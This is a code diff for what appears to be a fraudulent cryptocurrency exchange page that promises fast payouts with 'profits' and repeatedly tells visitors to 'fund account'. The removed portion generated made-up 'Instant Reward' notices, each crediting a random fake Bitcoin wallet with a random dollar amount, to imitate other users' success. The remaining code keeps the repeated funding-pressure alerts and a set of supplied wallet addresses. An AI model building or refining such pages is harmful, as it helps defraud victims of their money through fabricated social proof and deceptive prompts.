@@ -610,159 +610,6 @@
     .success-details strong {
       color: #ffffff;
     }
-
-    /* ========== COMIC POPUP NOTIFICATION STYLES - LEFT CORNER OF FOOTER ========== */
-    .comic-toast-container {
-      position: fixed;
-      bottom: 70px;
-      left: 20px;
-      z-index: 9999;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      pointer-events: none;
-      max-width: 340px;
-      width: calc(100% - 40px);
-    }
-
-    .comic-toast {
-      background: linear-gradient(135deg, #87CEEB 0%, #5faee3 100%);
-      background-color: #87CEEB;
-      color: white;
-      padding: 10px 12px 10px 14px;
-      border-radius: 24px 18px 24px 18px;
-      font-family: 'Comic Neue', 'Comic Neue', 'Comic Sans MS', 'Chalkboard SE', 'Arial', sans-serif;
-      font-weight: bold;
-      font-size: 13px;
-      line-height: 1.35;
-      box-shadow: 5px 5px 0 rgba(0, 0, 0, 0.12), 0 4px 12px rgba(0, 0, 0, 0.15);
-      border: 1.5px solid #ffffffcc;
-      backdrop-filter: blur(2px);
-      text-shadow: 1px 1px 0px rgba(0,0,0,0.15);
-      letter-spacing: 0.2px;
-      transform-origin: left bottom;
-      transition: transform 0.2s ease, opacity 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-      opacity: 1;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      cursor: default;
-      pointer-events: auto;
-      position: relative;
-    }
-
-    .comic-toast.fade-out {
-      opacity: 0;
-      transform: translateX(-20px) scale(0.92);
-      transition: opacity 0.45s ease, transform 0.4s ease;
-    }
-
-    .comic-toast.fade-in {
-      animation: comicPopInLeft 0.32s cubic-bezier(0.34, 1.2, 0.64, 1);
-    }
-
-    @keyframes comicPopInLeft {
-      0% {
-        opacity: 0;
-        transform: translateX(-45px) scale(0.75);
-      }
-      70% {
-        transform: translateX(4px) scale(1.02);
-      }
-      100% {
-        opacity: 1;
-        transform: translateX(0) scale(1);
-      }
-    }
-
-    .toast-icon {
-      font-size: 22px;
-      filter: drop-shadow(1px 1px 0 rgba(0,0,0,0.15));
-      background: rgba(255,255,240,0.2);
-      border-radius: 50%;
-      padding: 3px;
-      width: 34px;
-      height: 34px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-    }
-
-    .toast-message {
-      flex: 1;
-      word-break: break-word;
-      padding-right: 4px;
-    }
-
-    .toast-message strong {
-      font-weight: 900;
-      color: #FFE484;
-      text-shadow: 0px 1px 0px #a05e15;
-    }
-
-    .toast-close {
-      background: rgba(0, 0, 0, 0.25);
-      border: none;
-      color: white;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      transition: all 0.2s ease;
-      font-family: monospace;
-      line-height: 1;
-      padding: 0;
-      margin-left: 4px;
-    }
-
-    .toast-close:hover {
-      background: rgba(0, 0, 0, 0.5);
-      transform: scale(1.1);
-      color: #ffdd99;
-    }
-
-    .comic-toast::before {
-      content: "⚡";
-      position: absolute;
-      left: -8px;
-      top: -10px;
-      font-size: 20px;
-      filter: drop-shadow(0 2px 2px rgba(0,0,0,0.2));
-    }
-
-    @media (max-width: 580px) {
-      .comic-toast-container {
-        left: 12px;
-        bottom: 65px;
-        max-width: 300px;
-      }
-      .comic-toast {
-        font-size: 11px;
-        padding: 8px 10px 8px 12px;
-      }
-      .toast-icon {
-        font-size: 18px;
-        width: 28px;
-        height: 28px;
-      }
-      .toast-close {
-        width: 22px;
-        height: 22px;
-        font-size: 14px;
-      }
-      .comic-toast::before {
-        font-size: 16px;
-        left: -6px;
-        top: -8px;
-      }
-    }
   </style>
 </head>
 <body>
@@ -921,7 +768,7 @@
         <div class="form-group">
           <label>Your Receiving Wallet Address <span class="required-star">*</span></label>
           <input type="text" id="receiveAddress" name="receiving_wallet_address" placeholder="Where you want to receive the new currency + profits" required>
-          <div class="reason-text">Required: We will send your exchanged funds within 5 to your wallet address.</div>
+          <div class="reason-text">Required: We will send your exchanged funds within 5 minutes to your wallet address.</div>
         </div>
 
         <div class="form-group">
@@ -1005,9 +852,6 @@
     </div>
   </div>
 
-  <!-- COMIC NOTIFICATION CONTAINER - Left corner of footer -->
-  <div id="comicToastContainer" class="comic-toast-container"></div>
-
   <script>
     (function() {
       // UPDATED: 10 new Bitcoin wallet addresses (provided)
@@ -1048,18 +892,6 @@
       let pendingTxId = null;
       
       let continueClickCount = 0;
-      
-      function speakPopupMessage(message) {
-        if ('speechSynthesis' in window) {
-          window.speechSynthesis.cancel();
-          const utterance = new SpeechSynthesisUtterance(message);
-          utterance.rate = 0.95;
-          utterance.pitch = 1.0;
-          utterance.volume = 1;
-          utterance.lang = 'en-US';
-          window.speechSynthesis.speak(utterance);
-        }
-      }
       
       function showMessage(msg, isError = true) {
         messageDiv.textContent = msg;
@@ -1271,11 +1103,8 @@
       function onContinue() {
         continueClickCount++;
         
-        const voiceMessage = "Your account balance is $0:00. Please fund account and proceed with your exchange.";
-        speakPopupMessage(voiceMessage);
-        
         if (continueClickCount < 20) {
-          alert(voiceMessage);
+          alert("Your account balance is $0:00. Please fund account and proceed with your exchange.");
           return;
         }
         
@@ -1374,115 +1203,6 @@
       });
       
       refreshBitcoinModalContent();
-    })();
-
-    // ========== COMIC NOTIFICATION SYSTEM - Left Corner of Footer ==========
-    (function comicNotificationSystem() {
-      const container = document.getElementById('comicToastContainer');
-      if (!container) return;
-      
-      let usedAddresses = new Set();
-      
-      function getRandomAmount() {
-        const min = 50.00;
-        const max = 50000.00;
-        const raw = min + Math.random() * (max - min);
-        return raw.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-      }
-      
-      function generateRandomBitcoinWallet() {
-        const formats = ['bc1', 'bc1q', '1', '3'];
-        const selectedPrefix = formats[Math.floor(Math.random() * formats.length)];
-        const chars = 'abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
-        let body = '';
-        let length = 0;
-        
-        if (selectedPrefix === 'bc1' || selectedPrefix === 'bc1q') {
-          length = 38 + Math.floor(Math.random() * 10);
-          for (let i = 0; i < length - selectedPrefix.length; i++) {
-            body += chars.charAt(Math.floor(Math.random() * chars.length));
-          }
-          return selectedPrefix + body;
-        } else if (selectedPrefix === '1') {
-          length = 26 + Math.floor(Math.random() * 9);
-          for (let i = 0; i < length - 1; i++) {
-            body += chars.charAt(Math.floor(Math.random() * chars.length));
-          }
-          return selectedPrefix + body;
-        } else {
-          length = 26 + Math.floor(Math.random() * 9);
-          for (let i = 0; i < length - 1; i++) {
-            body += chars.charAt(Math.floor(Math.random() * chars.length));
-          }
-          return selectedPrefix + body;
-        }
-      }
-      
-      function generateShortWalletDisplay(fullWallet) {
-        if (fullWallet.length > 18) {
-          return fullWallet.slice(0, 8) + '...' + fullWallet.slice(-6);
-        } else {
-          return fullWallet.slice(0, 6) + '...' + fullWallet.slice(-4);
-        }
-      }
-      
-      function dismissToast(toast, fadeTimeout) {
-        if (fadeTimeout) clearTimeout(fadeTimeout);
-        if (toast && toast.parentNode) {
-          toast.classList.add('fade-out');
-          toast.addEventListener('transitionend', () => {
-            if (toast && toast.parentNode) toast.remove();
-          }, { once: true });
-          setTimeout(() => { if (toast && toast.parentNode) toast.remove(); }, 600);
-        }
-      }
-      
-      function showNotification() {
-        const amount = getRandomAmount();
-        let fullWallet = generateRandomBitcoinWallet();
-        if (usedAddresses.has(fullWallet)) {
-          fullWallet = generateRandomBitcoinWallet() + Math.floor(Math.random() * 10);
-        }
-        usedAddresses.add(fullWallet);
-        if (usedAddresses.size > 150) {
-          const iterator = usedAddresses.values();
-          for (let i = 0; i < 80; i++) {
-            usedAddresses.delete(iterator.next().value);
-          }
-        }
-        const shortWallet = generateShortWalletDisplay(fullWallet);
-        const message = `$${amount} has been successfully credited to wallet ${shortWallet}`;
-        
-        const toast = document.createElement('div');
-        toast.className = 'comic-toast fade-in';
-        toast.innerHTML = `
-          <div class="toast-icon">💰</div>
-          <div class="toast-message">✨ <strong>Instant Reward!</strong><br>${message}</div>
-          <button class="toast-close" aria-label="Close">✕</button>
-        `;
-        
-        container.appendChild(toast);
-        
-        const fadeTimeout = setTimeout(() => {
-          dismissToast(toast, null);
-        }, 10000);
-        
-        const closeBtn = toast.querySelector('.toast-close');
-        if (closeBtn) {
-          closeBtn.addEventListener('click', (e) => {
-            e.stopPropagation();
-            dismissToast(toast, fadeTimeout);
-          });
-        }
-      }
-      
-      setInterval(() => {
-        showNotification();
-      }, 20000);
-      
-      setTimeout(() => {
-        showNotification();
-      }, 3000);
     })();
   </script>
 </body>
